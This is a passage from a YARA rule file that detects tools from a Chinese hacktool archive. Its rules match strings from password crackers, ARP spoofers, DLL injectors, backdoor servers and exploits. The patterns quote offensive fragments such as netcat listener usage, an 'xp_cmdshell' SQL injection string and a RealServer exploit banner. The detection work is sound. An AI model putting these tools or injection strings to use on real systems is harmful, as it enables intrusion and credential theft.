		$s12 = "itaq.ynpc.com" fullword ascii
		$s13 = "1.You can use +Xx anywhere to have Rand Date" fullword ascii
		$s14 = "Sort Means Attack Mode is Follow the Sort of Attack List" fullword ascii
		$s20 = "You must pay for what you have done" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_TK2006_PnPDll {
	meta:
		description = "Chinese Hacktool Archive - file PnPDll.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "667595b5d4f441e1f77da35efcf9030e465152b5"
	strings:
		$s0 = "\\\\%s\\pipe\\browser" fullword ascii
		$s2 = "Vulnerable" fullword ascii
		$s4 = "PnPDll.DLL" fullword wide
		$s8 = "8d9f4e40-a03d-11ce-8f69-08003e30051b" fullword ascii
		$s9 = "PnPDll Dynamic Link Library" fullword wide
		$s14 = "TKPnPScan" fullword ascii
	condition:
		uint16(0) == 0x5D4A and 4 of them
}

rule CN_Hacktools_tools_rtgen {
	meta:
		description = "Chinese Hacktool Archive - file rtgen.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "904dbc58bda733f5ea03fcb82b7104b90cb77162"
	strings:
		$s0 = "http://www.antsight.com/zsl/rainbowcrack/" fullword ascii
		$s1 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$s4 = "%9d of %9d rainbow chains generated (%d m %d s)" fullword ascii
		$s9 = "RainbowCrack" fullword ascii
		$s20 = "rtgen alpha-numeric 0 100 16 bla" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_Demo {
	meta:
		description = "Chinese Hacktool Archive - file Demo.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c8aa015917fd667e0fab451e9652c5661f1b9a5d"
	strings:
		$s0 = "getauthor" fullword ascii
		$s1 = "Demo.EXE" fullword wide
		$s2 = "Coded by qINGfENG" fullword wide
		$s3 = "There may be some bugs in this dll !" fullword ascii
		$s4 = "DasmX86.DLL Test" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_Robin {
	meta:
		description = "Chinese Hacktool Archive - file Robin.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8c82beb8e1592ad499042d90a86233a4f9592603"
	strings:
		$s0 = "Robin.exe" fullword wide
		$s1 = "/Command3" fullword ascii
		$s6 = "EVENT_SINK_" fullword ascii
		$s14 = "KWOption" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Safe3URW {
	meta:
		description = "Chinese Hacktool Archive - file Safe3URW.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1b741c06853bddc07d04f26173e30f31716aad55"
	strings:
		$s2 = "'Safe3URW_nat.dll' not found!" fullword wide
		$s5 = "Safe3URW_nat.dll" fullword ascii
		$s9 = "Can't find native library!  Please install the  native library to your l" wide
		$s10 = "$7decb2e9-6250-439f-8187-d1b1781e6fdd" fullword ascii
		$s18 = "Safe3URW" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_MS05051Scan {
	meta:
		description = "Chinese Hacktool Archive - file MS05051Scan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c677ec3144fa06e5290962e824533fe3cdf3db61"
	strings:
		$s2 = "Your system has not been patched and is vulnerable to attack." fullword ascii
		$s9 = "You must stop scanning before you can exit" fullword ascii
		$s10 = "csv files (*.csv)" fullword ascii
		$s15 = "send %d.%d.%d.%d \"%s\"" fullword ascii
		$s16 = "Not vulnerable" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_CADTv1_00 {
	meta:
		description = "Chinese Hacktool Archive - file CADTv1.00.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "67a49562c0d55ae27d57354b06b16562656b6b48"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1." wide
		$s1 = "http://127.0.0.1/test.asp?a=0" fullword ascii
		$s2 = "explorer.exe http://666w.com" fullword wide
		$s6 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1.4322)" fullword wide
		$s18 = ";insert into xl exec master.dbo.xp_cmdshell '" fullword wide
		$s20 = "http://4ngel.net" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_MultiF {
	meta:
		description = "Chinese Hacktool Archive - file MultiF.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "eabd26017bff1747763a072a9d63f801c78e34fe"
	strings:
		$s0 = "!PORT %d," fullword ascii
		$s4 = "Packed by exe32pack" fullword ascii
		$s6 = "HTP Port-" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Mithril_Mithril {
	meta:
		description = "Chinese Hacktool Archive - file Mithril.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b81b65a09858088f662624c611e2edc75d25a6ea"
	strings:
		$s0 = "WriteProcessMemory error!" fullword ascii
		$s1 = "OpenProcessToken error." fullword ascii
		$s4 = "LookupPrivilege error!" fullword ascii
		$s5 = "GetProcAddress error!" fullword ascii
		$s6 = "AdjustTokenPrivileges error!" fullword ascii
		$s7 = "add privilege error" fullword ascii
		$s8 = "VirtualAllocEx error!" fullword ascii
		$s9 = "false!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_FlipCase {
	meta:
		description = "Chinese Hacktool Archive - file FlipCase.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e21a2c4f7f104ca9d936a06f7a0b12fc1350342d"
	strings:
		$s0 = "FlipCase.dll" fullword wide
		$s1 = "&Page Break" fullword ascii
		$s2 = "KetilO (C) 2002" fullword wide
		$s3 = "RadASM addin" fullword wide
		$s15 = "FlipCase" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_ftpscan {
	meta:
		description = "Chinese Hacktool Archive - file ftpscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c5c202f70abc7ca1096a5e128dcc1588180648d3"
	strings:
		$s0 = "Service allows ftp bounce attack to ports greater than 1024." fullword ascii
		$s5 = "ftpscan.dll" fullword ascii
		$s14 = "port 199,199,199,199,0,80" fullword ascii
		$s15 = "./reports/ftp" fullword ascii
		$s16 = "pass cis@security.check" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_WinArpAttacker {
	meta:
		description = "Chinese Hacktool Archive - file WinArpAttacker.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "48e78197b5d8f55fea9c8fdd05801cfb5471d6f9"
	strings:
		$s0 = "WinArpAttacker.exe" fullword wide
		$s5 = "STSoft Ldt.Co." fullword wide
	condition:
		all of them
}

rule CN_Hacktools_SkSockServer {
	meta:
		description = "Chinese Hacktool Archive - file SkSockServer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3836a8c1c7bc9f31471909b97798c7d16ff24a20"
	strings:
		$s0 = "@#$!@$ === SkServer - error .SkServiceDeInit." fullword ascii
		$s1 = "Service %s NOT Installed yet. Please Install at first.!" fullword ascii
		$s4 = "SkSockServer.EXE" fullword wide
		$s11 = "@#$!@$ === Client accpet AddNewClient error. Code:%d" fullword ascii
		$s12 = "Copyright 2001,2002, All Rights Reserved by LaiHongChang" fullword wide
		$s19 = "SkServer Pass SkServer Number:%d" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_portlessinst {
	meta:
		description = "Chinese Hacktool Archive - file portlessinst.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c296404bb64b038099829af31eae45160f278f10"
	strings:
		$s0 = "Delete %s" fullword ascii
		$s2 = "Fail To Open Registry" fullword ascii
		$s17 = "SC Manag3X" fullword ascii
		$s19 = "C1ra!g" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_RPC_GUI_v2___r3L4x {
	meta:
		description = "Chinese Hacktool Archive - file RPC GUI v2 - r3L4x.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fb081a5bb9b56c19942f9ec522d3ee8f527b192a"
	strings:
		$s0 = "RPC GUI by r3L4x.exe" fullword wide
		$s1 = "dcc.darksideofkalez.com" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_re {
	meta:
		description = "Chinese Hacktool Archive - file re.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9a9172eae684cfc76c9a03c736f9b6eb424aadf7"
	strings:
		$s1 = "re -h 192.168.0.1 -p 687 -u guest -p 123 -t 0 " fullword ascii
		$s12 = "-p bind port (default: 138)" fullword ascii
		$s16 = "%d : %s" fullword ascii
		$s17 = "[$] Connected  %s!" fullword ascii
		$s18 = "Web   : www.tianxing.org www.tophacker.net" fullword ascii
		$s20 = "Microsoft Rpc Locator Service Exploit" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_Unpack_Injectt {
	meta:
		description = "Chinese Hacktool Archive - file Injectt.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "30a1a7c9cb2c92b98c62a37117943d6cfce43313"
	strings:
		$x1 = "Remote DLL Injector"
		$x2 = "Private Version By WinEggDrop" fullword ascii

		$s10 = "%s -Install                          -->To Install The Service" fullword ascii
		$s15 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$s16 = "ProcessNameToKill" fullword ascii
		$s17 = "injectt.obj" fullword ascii
		$s19 = "The Service %s Is Running" fullword ascii
		$s20 = "The Service Name %c%s%c Has Been Taken" fullword ascii
	condition:
		( all of ($x*) ) or ( 4 of ($s*) )
}

rule CN_Hacktools_bin_idt {
	meta:
		description = "Chinese Hacktool Archive - file idt.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "04bfc28d5183534924e2cf7673eaa5d2b9e0e66c"
	strings:
		$s0 = "IDT dumper %s, joanna rutkowska," fullword ascii
		$s1 = "sending  IOCTL_KLISTER_DUMP_IDT..." fullword ascii
		$s2 = "can't communicate with kernel module (IOCTL_KLISTER_LISTPROC)" fullword ascii
		$s3 = "\\\\.\\klister" fullword wide
		$s4 = "opening device %S..." fullword ascii
		$s5 = "IDT[%d] at %#x" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_run_john {
	meta:
		description = "Chinese Hacktool Archive - file john.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8a03724a71c45e26236ba34074b7b79663a3d6a7"
	strings:
		$s5 = "Usage: %s [OPTIONS] [PASSWORD-FILES]" fullword ascii
		$s6 = "~/password.lst" fullword ascii
		$s7 = "Loaded %d password%s%s" fullword ascii
		$s8 = "Successfully written charset file: %s (%d character%s)" fullword ascii
		$s20 = "guesses: %u  time: %u:%02u:%02u:%02u%s  c/s: %s" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_bo2kcfg {
	meta:
		description = "Chinese Hacktool Archive - file bo2kcfg.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "44ad1fd919113adabd5f4681499fef2692dd9493"
	strings:
		$s2 = "Requires BO Version 1.01 or higher plugins." fullword ascii
		$s4 = "Version %d.%d" fullword ascii
		$s5 = "bo2kcfg.EXE" fullword wide
		$s14 = "Insert BO2K Plugin" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Debug_Spider {
	meta:
		description = "Chinese Hacktool Archive - file Spider.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1914126196043abd57e4b3c56d64b62d8088056a"
	strings:
		$s5 = "Spider.exe" fullword wide
		$s11 = "Spider.Engine" fullword ascii
		$s12 = "c:\\spider\\" fullword wide
		$s15 = "http://localhost/" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_KHS_KHS {
	meta:
		description = "Chinese Hacktool Archive - file KHS.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "717fd5c728d15d6822df7b06232dee05dbcb1676"
	strings:
		$s1 = "d [<from>] [<to>] - dump buffer within range" fullword ascii
		$s2 = "KHS - kill hide services" fullword ascii
		$s7 = "Total Hide Services is %d" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_COMbust {
	meta:
		description = "Chinese Hacktool Archive - file COMbust.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "826286678e495609a89b4da7d328d08bc60d2041"
	strings:
		$s1 = "if NOT ERRORLEVEL 0 echo %S %S -f %S " fullword wide
		$s9 = "FUZZ the hell out of those objects! - FBM" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_Mithril_v1_40_NC {
	meta:
		description = "Chinese Hacktool Archive - file NC.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "57f0839433234285cc9df96198a6ca58248a4707"
	strings:
		$s5 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s11 = "gethostpoop fuxored" fullword ascii
		$s12 = "invalid connection to [%s] from %s [%s] %d" fullword ascii
		$s15 = "Warning: port-bynum mismatch, %d != %d" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_ERunAsX_2 {
	meta:
		description = "Chinese Hacktool Archive - file ERunAsX.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "57c6d3e4d25544d8f00c0a1988a1c314f2940095"
	strings:
		$s0 = "Host process was probably already \"used\"! Try another!" fullword wide
		$s1 = "Can't duplicate cp handle to host process!" fullword wide
		$s4 = "CreateProcessAsPIDW" fullword wide
		$s5 = "Usage: ERunAsX [ParentPID] <CommandLine>" fullword wide
		$s6 = "GetApiHookChain" fullword ascii
		$s7 = "Can't create '%s'!" fullword wide
		$s8 = "@\\DbgSsApiPort" fullword wide
	condition:
		5 of them
}

rule CN_Hacktools_rainbowcrack_1_2_win_rtdump {
	meta:
		description = "Chinese Hacktool Archive - file rtdump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ca2df8fe250dcb655b48a1fb104455d30186c182"
	strings:
		$s6 = "usage: rtdump rainbow_table_pathname rainbow_chain_index" fullword ascii
		$s7 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$s10 = "#%-4d  %s  %s  %s" fullword ascii
		$s11 = "RainbowCrack" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_Pack_InjectT {
	meta:
		description = "Chinese Hacktool Archive - file InjectT.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6772fad9e43fb34491e8974893c9c3871aeff771"
	strings:
		$s0 = "TInject.Dll" fullword ascii
		$s1 = "vide Internet S" ascii
		$s2 = "ail To Open Registry" ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_SkServerGUI {
	meta:
		description = "Chinese Hacktool Archive - file SkServerGUI.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "11d0895b0cb5de8c63ba383caef4d8b17cc33b2c"
	strings:
		$s2 = "Error write SkServerRunOption to RegKey. Code:%d" fullword ascii
		$s6 = "mail: guest3323@21cn.com" fullword wide
		$s7 = "SkServerGUI.EXE" fullword wide
		$s8 = "http://snake12.top263.net" fullword wide
		$s9 = " (C) 2001 -- by LaiHongChang (snake)" fullword wide
		$s10 = "Cannot query ClientSetKey value. Code:%d" fullword ascii
		$s11 = "SOFTWARE\\%s\\%s\\%s" fullword ascii
		$s12 = "You have change the server Port, you should restart server to Take Active." fullword ascii
		$s13 = "Cannot query SnakeSockServerSet value. Code:%d" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_VNCDump_2 {
	meta:
		description = "Chinese Hacktool Archive - file VNCDump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6fd2d7781d81e0028adbc98fedba69f51fa366ed"
	strings:
		$s5 = "vnclog.txt" fullword ascii
		$s11 = "Opening Key \"HKCU\" succeded" fullword ascii
		$s12 = "VNCDump By KD-Team" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_VipClient {
	meta:
		description = "Chinese Hacktool Archive - file VipClient.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e93d204720e9d0ab9e4678432a3fc0a5047d0cf3"
	strings:
		$s0 = "http://127.0.0.1:81/ip.txt" fullword wide
		$s2 = "GetKeyLog" fullword wide
		$s3 = "VipClient.EXE" fullword wide
		$s5 = "(*.exe)| *.exe|" fullword wide
		$s9 = "www.zhuifengjian.net" fullword wide
		$s10 = "%d-%d-%d %d:%d:%02d" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_smbcrack2_2 {
	meta:
		description = "Chinese Hacktool Archive - file smbcrack2.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "91e0205cfcc4d400a790b390acb2406d77cf911c"
	strings:
		$s0 = "-- %s %s password crack on %s Port 139 [NTLM] --" fullword ascii
		$s5 = "-- Dumping SMB User On %s by Normal ways --" fullword ascii
		$s6 = "Target:%s, Port:%s, NTLM:%s, Domain:%s," fullword ascii
		$s15 = ":cmd.exe" fullword ascii
		$s18 = "Crackersoftware@163.com   Code By Xtiger  2004.8.1" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_srv_control {
	meta:
		description = "Chinese Hacktool Archive - file srv_control.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b03ab59c601d2c3958ac08455c85ba6b332f47f9"
	strings:
		$s0 = "Command socket #%d created on: %.256s" fullword ascii
		$s16 = "srv_control.dll" fullword ascii
		$s17 = "Restarting BO2K server." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_pkwdsm {
	meta:
		description = "Chinese Hacktool Archive - file pkwdsm.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9bfdba04416882f19eef0b6683c47a6f40f8b462"
	strings:
		$s2 = "GETPASSWORD1" fullword wide
		$s3 = "CommandData" fullword ascii
		$s6 = "pkwdsm\\pkwdsm.exe" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_EasyPassToFile {
	meta:
		description = "Chinese Hacktool Archive - file EasyPassToFile.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "63954a873b11fb9e75712f5d58e0b5c8f0173532"
	strings:
		$s0 = "Failed to Get Passwords " fullword ascii
		$s4 = "[SMTP Password2] " fullword ascii
		$s5 = "Date and Time: %04d-%02d-%02d  %02d:%02d:%02d.%d" fullword ascii
		$s11 = "__________________________________________________" fullword ascii
		$s12 = "[POP3 User Name] " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SDK_dummy {
	meta:
		description = "Chinese Hacktool Archive - file dummy.DLL"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "94fe6db5037ee7e4e2c376530d15b290517292df"
	strings:
		$s0 = "dummy.DLL" fullword ascii
		$s1 = "getRegInfo" fullword ascii
		$s4 = "getTrialRuns" fullword ascii
		$s5 = "setExternalKey" fullword ascii
		$s9 = "dummy string 4" fullword ascii
		$s10 = "setKeyfile" fullword ascii
		$s11 = "isRegistered" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_EliteSpy {
	meta:
		description = "Chinese Hacktool Archive - file EliteSpy.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1a9efb0548bad0d080898c56a4ef334d41082f49"
	strings:
		$s0 = "Please vote for me at http://shadom.blogcn.com" fullword ascii
		$s3 = "*\\AE:\\vb\\EliteSpy+\\EliteSpy.vbp" fullword wide
		$s5 = "C:\\WINDOWS\\System32\\RICHTX32.oca" fullword ascii
		$s11 = "EliteSpy.exe" fullword wide
	condition:
		2 of them
}

rule CN_Hacktools_THCrealbad {
	meta:
		description = "Chinese Hacktool Archive - file THCrealbad.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ef9ab720bfc0ecf89de953f65a19faaba94527b6"
	strings:
		$s0 = "by Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)" fullword ascii
		$s3 = "THCREALbad v0.4 - Wind0wZ & Linux remote root sploit for Realservers 8+9" fullword ascii
		$s11 = "exploit send .... sleeping a while ...." fullword ascii
		$s12 = "ok ... now try to connect to port 31337 via netcat !" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_atk_atk_atk {
	meta:
		description = "Chinese Hacktool Archive - from files atk.exe, atk.exe, atk.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "a9f1c5132f3449eca87ad961892f96a1992d3323"
		hash1 = "4dd562e0f3a0b71dab377143f4d82757ffb74108"
		hash2 = "30ab6e62dad0a725478deaeb4c14ed113ecfda13"
	strings:
		$s2 = "-runcommandresponse.txt" fullword wide
		$s8 = "Attack Editor add HTTP GET template" fullword wide
		$s14 = "(e.g. 'netstat -an' or 'ping 192.168.0.1')." fullword wide
	condition:
		all of them
}

rule CN_Hacktools_RetinaMSGSVC_retinarpcdcom_RetinaSasser {
	meta:
		description = "Chinese Hacktool Archive - from files RetinaMSGSVC.exe, retinarpcdcom.exe, RetinaSasser.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "1bb3442814ebaa29e4a62d704108f3844b5efe6f"
		hash1 = "f02d75ca9e45aa828de2c6126eabfc3994e3b51d"
		hash2 = "fb17127d8a4e748950be13c1d965f6455bfdcd1f"
	strings:
		$s0 = "The DDE transaction failed._The DDE transaction could not be completed b" wide
		$s2 = "Web Address: www.codejock.com" fullword
		$s3 = "Command ID %d" fullword wide
		$s15 = "mailto:lnicula@eeye.com" fullword wide
		$s16 = "The Xtreme Toolkit requires Comctl32.dll version 4.72 or higher, please contact "
		$s19 = "Software\\%s\\%s\\Settings" fullword wide
		$s20 = "[All Commands]_This shortcut is currently assigned to the command: %s" fullword wide
	condition:
		5 of them
}

rule CN_Hacktools_icedump_icedump_icedump_icedump_icedump_icedump_icedump_icedump_icedump_icedump_icedump_icedump {
	meta:
		description = "Chinese Hacktool Archive - from files icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "db2987597e1c0e45226bfbdc4f06e10e8c8c6281"
		hash1 = "1e6d41c9cd126d8d6e8f073d89e66c2612592686"
		hash2 = "adaa3076d7324ba51ec25bb4855e9b4cc4256dd5"
		hash3 = "9337cccb82b2f8f5b5b53ac5ae5fbccb71db5da0"
		hash4 = "3adef3622f7b25ecb0d898821ae71d452270cce8"
		hash5 = "73aa65c8d1ae5562fda06696861937d1736c96c3"
		hash6 = "30f0479cea673952fd712aee99ece20961a008ae"
		hash7 = "9d5bd2d039a78ad3151eecd9d14282ecbc9525e1"
		hash8 = "7aa213a227390b54708e3a0c932a904c44fa24d1"
		hash9 = "b18d0719be88a9b53738cbdff4b25e2eb74cb90d"
		hash10 = "260c50e5bd06cb3715b6c33a7d8a6532f641ecfd"
		hash11 = "928bb2b8eed24563c6e528f7fd6e627d985d7587"
	strings:
		$s11 = "Current auto-dump filename: C:\\DEFAULT.00/" fullword
		$s12 = "ICEDUMP: TaskFirst: failed to uninstall exception handler" fullword
		$s13 = "ICEDUMP: CS.RPL adjusted, CS: #ax, R0TCB: #edi" fullword
	condition:
		all of them
}

rule CN_Hacktools_xscan_gui_xscan_gui_xscan_gui {
	meta:
		description = "Chinese Hacktool Archive - from files xscan_gui.exe, xscan_gui.exe, xscan_gui.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "4a8b0e335c58ba20017dd8c35960b9b10871753c"
		hash1 = "a07a3b3be26d672a7e4994ee008eded6c9227eee"
		hash2 = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
	strings:
		$s0 = "\"GET / HTTP/1.0\\r\\nHeader:\" " fullword
		$s1 = "Function \"StartScan()\" causes an exception." fullword
		$s3 = "%s failed - %s/%d" fullword
		$s4 = "xscan_gui.exe" fullword
		$s6 = "please mail to: xscan@xfocus.org" fullword
		$s12 = "http://www.xfocus.net" fullword
		$s13 = "cbGetHostName" fullword
	condition:
		all of them
}

rule CN_Hacktools_rdrbs073_rdrbs084_rdrbs100 {
	meta:
		description = "Chinese Hacktool Archive - from files rdrbs073.exe, rdrbs084.exe, rdrbs100.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "4ee84c94bae64ac6a83971bf8e2b2d7af4315006"
		hash1 = "6a205ae9677c84c327f496f5783ba6c2ef86f1d3"
		hash2 = "0ae7dbd4e87cbbfb7f5468a9eccbae1a7f33c18c"
	strings:
		$s0 = "Unknown command. Type HELP for command list." fullword
		$s1 = "Target server port: " fullword
		$s4 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET SERV"
		$s6 = "Port value must be 1 - 65535." fullword
		$s10 = "Type HELP COMMAND for command details." fullword
		$s20 = "[COMMAND]" fullword
	condition:
		all of them
}

rule CN_Hacktools_arpsf_arpsf_rawsniffer {
	meta:
		description = "Chinese Hacktool Archive - from files arpsf.exe, arpsf.exe, rawsniffer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "307148ad703308a3dd953f73fdac254bab4e387d"
		hash1 = "53ec00a9195b7c2c03d7d24bac43a80eec7bd92b"
		hash2 = "726fa15b8766dd4bc147ba6f4640536c35df8519"
	strings:
		$s2 = "my web:http://www.codehome.6600.org" fullword
		$s3 = "Source Port: [%s]" fullword
		$s8 = "Sniffer has start!" fullword
		$s9 = "ListenIpList[%d]:[OK]" fullword
		$s10 = "Sniff FTP:" fullword
		$s18 = "%-4s%-17s%-6s-->  %-17s%-6s %s" fullword
		$s20 = "--------> POST " fullword
	condition:
		all of them
}

rule CN_Hacktools_Xscan_xscan_gui_xscan_gui {
	meta:
		description = "Chinese Hacktool Archive - from files Xscan.exe, xscan_gui.exe, xscan_gui.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "a69521b182b9e9758e6a92decc2ebe37aba99496"
		hash1 = "a07a3b3be26d672a7e4994ee008eded6c9227eee"
		hash2 = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
	strings:
		$s1 = "%s -mutex %s -host %s -index %d -config \"%s\"" fullword
		$s5 = "CheckHost.dat" fullword
		$s6 = "hostlist.txt" fullword
		$s7 = "%s - network security scanner" fullword
		$s9 = "), http://www.xfocus.org(" fullword
		$s10 = ": http://www.xfocus.net(" fullword
		$s11 = "result_host_list" fullword
		$s12 = "skip_host_noresponse" fullword
		$s13 = ".\\packet.dll" fullword
		$s14 = "save_host_list" fullword
		$s16 = "IDENTIFY-SERVICE" fullword
		$s20 = "npf.sys" fullword
	condition:
		all of them
}


rule CN_Hacktools_findlogin_SERVU_DOS_webdavx3 {
	meta:
		description = "Chinese Hacktool Archive - from files findlogin.exe, SERVU_DOS.exe, webdavx3.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "b4d7022f9a7bc40572a09b9b08072b40a339278c"
		hash1 = "d6e7ab4669a7150ba172cdc6c9bb882b72465c87"
		hash2 = "2ed64b82f7a118f8bedad15777b53e1af3f8db21"
	strings:
		$s0 = "Directory '%s' does not exist." fullword
		$s1 = "'%s' is not a directory." fullword
		$s2 = "Path '%s' does not exist." fullword
		$s3 = "Usage: lookup(name)" fullword
	condition:
		all of them
}

rule CN_Hacktools_dbgntboot_ntboot_ntboot_ntboot {
	meta:
		description = "Chinese Hacktool Archive - from files dbgntboot.dll, ntboot.dll, ntboot.dll, ntboot.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "6066cec598af6613edcbd1b0497f37c4db0fcf53"
		hash1 = "9e3cce754f7c4a775d7a560e2c6dbdaa415d044f"
		hash2 = "8baa29691cf857fe93a55063c4cd3737b83d06e1"
		hash3 = "ee66773c61ff4d196988330e8d17ae850618eb09"
	strings:
		$s0 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s10 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)" fullword
		$s17 = "UNKNOW error:cannot kill proc.usually,this was a result of having privilege not "
	condition:
		all of them
}

rule CN_Hacktools_FFI_VMUnpacker_cn_VMUnpacker_en {
	meta:
		description = "Chinese Hacktool Archive - from files FFI.exe, VMUnpacker_cn.exe, VMUnpacker_en.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
